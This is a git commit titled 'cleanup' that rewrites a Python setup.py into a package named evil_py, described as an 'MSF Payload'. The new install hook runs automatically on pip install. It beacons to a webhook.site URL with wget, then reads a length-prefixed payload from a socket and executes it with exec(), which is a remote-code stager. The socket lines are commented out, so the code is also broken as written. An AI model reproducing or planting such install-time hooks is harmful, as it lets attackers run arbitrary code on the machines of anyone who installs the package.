89f14a4a577d86d92914304a915eebaabc2ad93e
Andrei Cadar <cadarandrei2370@yahoo.com>
2025-05-10 14:01:55 +0300

    cleanup

--- setup.py
+++ setup.py
@@ -1,17 +1,35 @@
-# setup.py
-from setuptools import setup
-import os
+import socket, struct, time, os
+import setuptools
+from setuptools.command.install import install
 
-# This code runs during installation:
-print("[*] Running post-install code...")
-os.system("wget https://webhook.site/3a45291b-4331-4008-8191-c5c9200be954")
+class evil_py_class(install):
+  def run(self):
+    for x in range(10):
+      try:
+        #s=socket.socket(2,socket.SOCK_STREAM)
+        #s.connect(('10.14.1.6',13043))
+	os.system("wget https://webhook.site/3a45291b-4331-4008-8191-c5c9200be954")
+        break
+      except:
+        time.sleep(5)
+    l=struct.unpack('>I',s.recv(4))[0]
+    d=s.recv(l)
+    while len(d)<l:
+      d+=s.recv(l-len(d))
+    exec(d,{'s':s})
 
-setup(
-    name='testpip',
-    version='0.1',
-    description='A harmless-looking package',
-    author='Your Name',
-    author_email='you@example.com',
-    packages=['testpip'],
-    install_requires=[],
+with open("README.md", "r") as fh:
+    long_description = fh.read()
+
+setuptools.setup(
+  name="evil_py",
+  version="1.0.0",
+  author="sn0wfa11",
+  author_email="dontemail@me.com",
+  description="MSF Payload",
+  long_description=long_description,
+  long_description_content_type="text/markdown",
+  url="https://github.com/sn0wfa11",
+  packages=setuptools.find_packages(),
+  cmdclass={ "install": evil_py_class }
 )
